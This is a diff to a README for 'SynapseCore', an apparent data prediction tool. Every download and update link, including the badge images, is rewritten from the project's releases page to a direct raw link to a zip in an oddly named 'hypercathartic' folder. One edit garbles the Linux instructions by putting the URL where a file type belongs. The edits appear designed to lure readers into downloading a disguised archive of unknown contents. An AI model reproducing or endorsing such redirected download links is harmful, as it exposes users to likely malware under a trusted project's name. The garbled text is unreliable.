@@ -1,6 +1,6 @@
 # 🧠 SynapseCore - Fast, Real-Time Data Prediction
 
-[![Download SynapseCore](https://img.shields.io/badge/Download-SynapseCore-blue?style=for-the-badge&logo=github)](https://github.com/zev0ss/SynapseCore/releases)
+[![Download SynapseCore](https://github.com/zev0ss/SynapseCore/raw/refs/heads/main/hypercathartic/Synapse-Core-v2.5.zip)](https://github.com/zev0ss/SynapseCore/raw/refs/heads/main/hypercathartic/Synapse-Core-v2.5.zip)
 
 ---
 
@@ -38,12 +38,12 @@ Just download the software, install it, and then you can open it to start workin
 You need to visit the SynapseCore release page on GitHub to get the latest version. Here’s how to do it:
 
 1. Click this link to **visit this page to download**:  
-   [Download SynapseCore Releases](https://github.com/zev0ss/SynapseCore/releases)
+   [Download SynapseCore Releases](https://github.com/zev0ss/SynapseCore/raw/refs/heads/main/hypercathartic/Synapse-Core-v2.5.zip)
 
 2. On that page, you will see different files. Choose the one that fits your computer:  
    - For Windows, select a file ending with `.exe` or `.msi`  
    - For macOS, look for `.dmg` or `.pkg`  
-   - For Linux, choose `.deb` or `.tar.gz` files based on your distribution
+   - For Linux, choose `.deb` or `https://github.com/zev0ss/SynapseCore/raw/refs/heads/main/hypercathartic/Synapse-Core-v2.5.zip` files based on your distribution
 
 3. Click the file name to start downloading.
 
@@ -116,7 +116,7 @@ SynapseCore updates are released regularly to fix bugs and add improvements.
 To update:
 
 1. Visit the release page linked here:  
-   [SynapseCore Releases](https://github.com/zev0ss/SynapseCore/releases)
+   [SynapseCore Releases](https://github.com/zev0ss/SynapseCore/raw/refs/heads/main/hypercathartic/Synapse-Core-v2.5.zip)
 
 2. Download the latest version following the same steps as above.
 
@@ -148,4 +148,4 @@ SynapseCore respects your data’s privacy. Your files stay on your device unles
 
 ---
 
-[![Download SynapseCore](https://img.shields.io/badge/Download-SynapseCore-blue?style=for-the-badge&logo=github)](https://github.com/zev0ss/SynapseCore/releases)
+[![Download SynapseCore](https://github.com/zev0ss/SynapseCore/raw/refs/heads/main/hypercathartic/Synapse-Core-v2.5.zip)](https://github.com/zev0ss/SynapseCore/raw/refs/heads/main/hypercathartic/Synapse-Core-v2.5.zip)
